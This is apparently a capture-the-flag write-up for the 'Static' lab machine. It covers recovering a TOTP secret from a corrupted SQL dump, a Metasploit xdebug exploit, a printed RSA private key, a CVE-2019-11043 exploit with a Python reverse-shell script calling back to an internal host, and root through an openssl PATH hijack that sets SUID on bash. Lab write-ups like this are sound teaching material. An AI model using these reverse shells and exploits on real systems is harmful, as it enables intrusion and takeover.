![STATIC](banner.png)

## Initial Foothold

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

Checking out the .ftp_uploads directory (that was mentioned in the robots.txt) on port 8080 we find a file indexing:

![ftp_uploads](ftp_uploads.png)

The warning.txt is giving us a hint on what to do here:
```
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

So we use the [gzip Recovery Toolkit](https://github.com/arenn/gzrt) to recover most of the db.sql.gz:

```
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsignint  a'n a)Co3 Nto_increment,sers name varchar(20) a'n a)Co, password varchar(40) a'n a)Co, totp varchar(16) a'n a)Co, primary key (idS iaA; 
INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim'admin'im'd05nade22ae348aeb5660fc2140aec35850c4da997m'd0orxxi4c7orxwwzlo'
IN
```

## User

We see the username admin and already found a login page in the vpn directory http://static.htb:8080/vpn/login.php.

When loging in with `admin:admin` we are asked to present a OTP for 2FA. 

In the recovered db.sql.gz we see a totp value which looks like a secret for 2FA token generators/apps. It is 18 chars long here but we can see at the beginning of the SQL-Query that it says varchar(16) so it is supposed to be only 16 chars, the additional 2 chars are propably some strange failure from the recovery process. We only need 16 characters so we use: `orxxi4c7orxwwzlo` as our secret and use this [TOTP.app](https://totp.app/) to generate our OTPs. 

After loging in we see some kind of "dashboard":

![dashboard](dashboard.png)

The tool let us create an .ovpn file with the name we provide. However we can't connect to it until we add `vpn.static.htb` to our /etc/hosts file. We got that information from within the ovpn file.

Now we only need to add an ip route to be able to perform various tasks on the machines inside the network, as for example scans.
We do this like so:

```
sudo ip route add 172.20.0.0/24 dev tun9 

```

Scanning 172.20.0.10 will give us:

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 19    2020-04-03 15:18  info.php
| -     2020-03-26 09:40  vpn/
|_
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Index of /
```

The info.php file tells us that XDEBUG is enabled to let's exploit it using the metasploit module:

```
Module options (exploit/unix/http/xdebug_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /info.php        yes       Path to target webapp
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.20.0.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
   SRVPORT  9000             yes       Port to listen for the debugger
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.30.0.10      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

GGs we got user.

## Root

For easier access we extract the private rsa key to connect to the machine:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

We can use that key to connect to our machine on Port 2222:
```
ssh -i static.key -P 2222 www-data@[Static-IP]
```

After further investigating from the "Web"-machine we found pki.secret
```
[-] ARP history:
db.pnet (172.20.0.11) at 02:42:ac:14:00:0b [ether] on eth0
? (172.20.0.1) at 02:42:bc:e2:be:68 [ether] on eth0
pki.secret (192.168.254.3) at 02:42:c0:a8:fe:03 [ether] on eth1
```

And it is running a php version that is vulnerable to [CVE-2019-11043](https://nvd.nist.gov/vuln/detail/CVE-2019-11043). So we used this [exploit](https://github.com/theMiddleBlue/CVE-2019-11043).

To make it run we first had to copy it to our web machine via scp. It ran successfully:

```
# python3 exploit.py --url http://192.168.254.3/index.php
[*] QSL candidate: 1752, 1757, 1762
[*] Target seems vulnerable: PHPSESSID=05b156ea034b903de6624f09c513541c; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://192.168.254.3/index.php?a=bin/ls+/
```

As the output says we can now run commands like this:
```
curl http://192.168.254.3/index.php?a=bin/ls+/
```

But we wanted a reverse shell so we wrote a little script that will do it for us:

```py
import requests

a = '/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''

for i in range(50):
    r1 = requests.get("http://192.168.254.3/index.php?a=" + a)
    print(r1.text)
```

Notice that we are using our "Web"-machines IP for the reverse shell so we also need to run our listener on it. To make that happen we also copied "nc" on it using scp.

There isn't much on the pki box except for a strange ersatool in /usr/bin. We quickly realized that it was the tool used to create our ovpn connections and we even found it's source code in /usr/src. However we didn't get much out of it so we investigated it further with [pspy](https://github.com/DominicBreuker/pspy). To get pspy running on the pki-machine we had to scp it on the web-machine and then download it from that machine using scp again:

```
www-data@pki:/tmp$ scp -i key www-data@192.168.254.2:/tmp/pspy ./pspy
```

As you can see in the screenshot below we saw that the ersatools calls different programs by it's absolut path, however it calls "openssl version" by it's relative PATH. 

![pspy](pspy.png)

We can exploit that like this:

First we add /tmp to our $PATH:
```
export PATH=/tmp:$PATH
```

Then we create our own "openssl"-script inside of /tmp
```
cd /tmp
echo "chmod u+s /bin/bash" > openssl
chmod +x openssl
```

Now we just run `ersatool` type `create` fill it with some random chars, exit out of it again.
The script now has called our own openssl script as root and executed what we echoed into it. Which is setting the SUID of root to /bin/bash.

Now we can just run

```
/bin/bash -p
```

to spawn a root shell.

